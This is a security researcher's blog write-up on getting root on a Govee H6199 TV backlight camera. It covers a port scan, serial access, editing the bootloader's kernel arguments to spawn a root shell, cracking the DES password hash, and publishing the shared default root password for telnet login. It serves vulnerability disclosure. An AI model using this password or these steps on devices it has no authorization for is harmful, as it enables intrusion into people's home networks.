---
# Feel free to add content and custom Front Matter to this file.
# To modify the layout, see https://jekyllrb.com/docs/themes/#overriding-theme-defaults

layout: default
toc: true
---
# Govee Immersion WiFi LED TV (H6199) - Part 1: Getting Access

<script type="text/javascript">toc()</script>

## Few words on the product
The <a href="https://www.amazon.de/gp/product/B08LYZMCGM">H6199</a> is a system that lets you add ambilight like TV background lights to your TV. It films the picture of the TV screen and set the colors of the led strip accordingly. I've bought this product already quite some time ago (around June 2021). I must admit it works pretty well, but since it connected to the WIFI (to automatically turn it on whenever the TV is turned on, the <a href="https://github.com/LaggAt/hacs-govee">hacs-govee</a> plugin works quite well) I was always having kind of mixed feeling.

It seems there is new hardware version of the device on the market which I was told behave differently. However, I couldn't get my hands on one of these yet. The hardware version I'm working on is 1.00.01. The <a href="https://play.google.com/store/apps/details?id=com.govee.home">Govee Home</a> app says the firmware version is: 1.06.02 (There seems to be no newer version).

## How it all started
As I said, I was always having mixed feeling about this device being in my network. So it all started with a port scan of the device:
```text
$ nmap -p - <IP-ADDRESS>
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-14 23:45 CEST
Nmap scan report for <IP-ADDRESS>
Host is up (0.014s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
23/tcp open  telnet
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 16.53 seconds
```

Well that escalated quickly: telnet is available. A quick check that it can really be used to login shows:
```text
$ telnet <IP-ADDRESS> 23
Trying <IP-ADDRESS>...
Connected to <IP-ADDRESS>.
Escape character is '^]'.

(none) login:
```

So, first things to try obviously are some publicly available wordlists, but I couldn't find one that figured out a correct user-password combination. If you think now: lets take a look at the http server. I tried that as this point, but it always seem to return "200 OK". Couldn't see what to do with that. There will probably be another part talking about reversing the web interface.

## We have physical access to the device. Why not use that?
Well, it requires to disassemble the device. And if you think the main SOC is located in this tiny little box with the buttons, then you ran into the same trap as me. The interesting things happen in the camera part. Fortunately, that board has already 4 soldering points for 3,3V, GND, RX and TX (The board actually says which is what, so I'll skip that here):

<center><img src="img/board.jpg" style="width:50%; max-width:800px;" alt="Board" /></center>

Aaand we can see that there is some serial output:

```text
$ picocom -b 115200 /dev/ttyUSB0
[ ... ]
Net:   eth0
Warning: eth0 (eth0) using random MAC address - 0a:b5:66:4e:39:de

Hit any key to stop autoboot:  0
device 0 offset 0x80000, size 0x400000

SF: 4194304 bytes @ 0x80000 Read: OK
## Booting kernel from Legacy Image at 42000000 ...
   Image Name:   Linux-4.9.37
   Image Type:   ARM Linux Kernel Image (uncompressed)
   Data Size:    3746996 Bytes = 3.6 MiB
   Load Address: 40008000
   Entry Point:  40008000
   Loading Kernel Image ... OK

Starting kernel ...

[ ... ]

RTW: Turbo EDCA =0x5ea42b
RTW: rtl8188f_fill_default_txdesc(wlan0): SP Packet(0x0806) rate=0x4 SeqNum = 24
221014222928.323989 DEBUG  [b19514c0] govee_ota.c(176)/ota_check_packet() - {"checkVersion":{"sku":"","versionHard":"","versionSoft":"","needUpdate":false,"download    Url":"","md5":"","size":0,"time":27763110},"message":"success","status":200}

221014222928.327555 INFO   [b19514c0] govee_ota.c(118)/ota_response_parser() - Device is not need upgrade.


(none) login:
```
Full serial output can be found <a href="serial_log.txt">here</a>

Actually there is not only output, we can even login via serial. But it also requires a password so we are out of luck for now. However, the following line indicates that we can interact with the bootloader:

```text
Hit any key to stop autoboot:  0
```

So, lets try that:
```text
picocom -b 115200 /dev/ttyUSB0
[ ... ]

Net:   eth0
Warning: eth0 (eth0) using random MAC address - 0a:b5:66:4e:39:de

Hit any key to stop autoboot:  0 
hisilicon # 
```

Well, we have a shell in the bootloader now. It seems to be quite powerful, unfortunately I couldn't find any real documentation about it. But the <a href="help.txt">help</a> command is good enough to figure out what can be done.

A simple way to get root access to a system is to modify the kernel command line arguments. If we manage to switch the init process to `/bin/sh` (or something similar), chances are good that we will get root access on the serial line. Using `printenv` we can see that those arguments are specified using environment variables:

```text
hisilicon # printenv
arch=arm
baudrate=115200
board=hi3516ev200
board_name=hi3516ev200
bootargs=mem=42M console=ttyAMA0,115200 root=/dev/mtdblock2 rootfstype=jffs2 rw init=/linuxrc mtdparts=hi_sfc:512K(u-boot.bin),4M(kernel),6M(rootfs.jffs2),7M(govee_A.bin),7M(govee_B.bin),7M(data.bin),512K(config.bin)
bootcmd=sf probe 0;sf read 0x42000000 0x80000 0x400000;bootm 0x42000000
bootdelay=0
cpu=armv7
ethact=eth0
govee_user_block=A
govee_ver=1.00.00
soc=hi3516ev200
stderr=serial
stdin=serial
stdout=serial
vendor=hisilicon
verify=n
```

The command `env edit bootargs` allows to interactively modify environment variables. The `bootargs` variable needs to be changed to:
```text
mem=42M console=ttyAMA0,115200 root=/dev/mtdblock2 rootfstype=jffs2 rw init=/bin/sh mtdparts=hi_sfc:512K(u-boot.bin),4M(kernel),6M(rootfs.jffs2),7M(govee_A.bin),7M(govee_B.bin),7M(data.bin),512K(config.bin)
```
Please note the `init=/bin/sh` part. Now we can start the device using the `boot` command:
```text
hisilicon # boot
device 0 offset 0x80000, size 0x400000

SF: 4194304 bytes @ 0x80000 Read: OK
## Booting kernel from Legacy Image at 42000000 ...
   Image Name:   Linux-4.9.37
   Image Type:   ARM Linux Kernel Image (uncompressed)
   Data Size:    3746996 Bytes = 3.6 MiB
   Load Address: 40008000
   Entry Point:  40008000
   Loading Kernel Image ... OK

Starting kernel ...

Booting Linux on physical CPU 0x0

[ ... ]

Freeing unused kernel memory: 176K (c06ce000 - c06fa000)
This architecture does not have kernel memory protection.
random: sh: uninitialized urandom read (4 bytes read)
/bin/sh: can't access tty; job control turned off
/ # id
uid=0(root) gid=0(root)
```
Full log can be found <a href="boot2root.txt">here</a>.

Now, we are already there, running as root. We could simply use `passwd` to change the root password and login via telnet or serial console. 

## Lets get the default root password 

Changing the root password manually, maybe good enough for devs to run their own things on the device. But I though its worth a shot to get the password that is set by default (So other people can skip the disassembling and soldering part). So lets look at `/etc/passwd` (there is no /etc/shadow on that system!):

```text
/ # cat /etc/passwd
root:oqRUv1hjheceM:0:0::/root:/bin/sh
```

Tbh, I was a bit confused at this point. This didn't look like a proper hash to me, but `hash-identifier` correctly assumed:
```text
$ hash-identifier 
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.1 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################

   -------------------------------------------------------------------------
 HASH: oqRUv1hjheceM

Possible Hashs:
[+]  DES(Unix)
```

I've never heard of that hash type, but `hashcat` seemed to support it (`--hash-type 1500`). One interesting fact about this "hash" is that it only support password up to 8 characters. A simple computer with a decent graphics card managed to brute-force all the combinations until (and including) 7 characters within a day. Brute-forcing 8 characters would have need around 80 days (still pretty doable, I would say). However, <a href='https://twitter.com/captnbanana'>captnbanana</a> eventually manged to crack the hash much faster. Thanks for your support :-). So, here is the plaintext password:

<center><b>govee@20</b></center>

Lets see if that works via telnet:
```text
$ telnet <IP-ADDRESS> 23
Trying <IP-ADDRESS>...
Connected to <IP_ADDRESS>.
Escape character is '^]'.

(none) login: root
Password: 
Welcome to HiLinux.
None of nfsroot found in cmdline.
~ # id
uid=0(root) gid=0(root) groups=0(root)
```

## Closing Words
In the end, a series of mistakes lead to an easy full system breach:
* Kernel command line arguments are not protected and serial line is still available
* Usage of improper hash function for the password. Not sure if we would have managed to crack the hash if a different hash function would have been used. However, the password itself is also pretty weak. 5 out of 8 characters are the company name, so I'd argue it would have been still possible. Anyway, having a non-device specific default password is not a good idea in general. 
* In particular having telnet running by default simplified the attack a lot. This should really be avoided.


I've contacted govee on their support mail, giving them some time to react. Until now I didn't even get a confirmation that they even care...

Have fun!
